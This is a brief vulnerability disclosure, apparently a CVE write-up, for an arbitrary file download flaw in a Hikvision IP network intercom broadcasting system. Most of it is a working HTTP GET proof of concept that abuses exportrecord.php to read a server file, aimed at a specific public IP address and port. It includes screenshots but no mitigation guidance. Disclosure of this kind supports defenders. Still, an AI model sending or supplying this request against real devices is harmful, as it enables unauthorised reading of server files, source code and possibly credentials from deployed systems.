There is an arbitrary file download vulnerability in the IP network intercom broadcasting system of Hangzhou Hikvision Digital Technology Co., Ltd.

![image](https://github.com/willchen0011/cve/assets/13689053/e75b3a42-379f-4782-a89d-746bf3966dbc)

1. Directly download any file through the following POC
POC
```
GET /php/exportrecord.php?downtype=10&downname=C:\ICPAS\Wnmp\WWW\php\conversion.php HTTP/1.1
Host: 219.128.48.234:4080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
X-Forwarded-For: 1.1.1.1
```
![image](https://github.com/willchen0011/cve/assets/13689053/71f31e14-2199-4219-93f7-23288b6cf6bb)
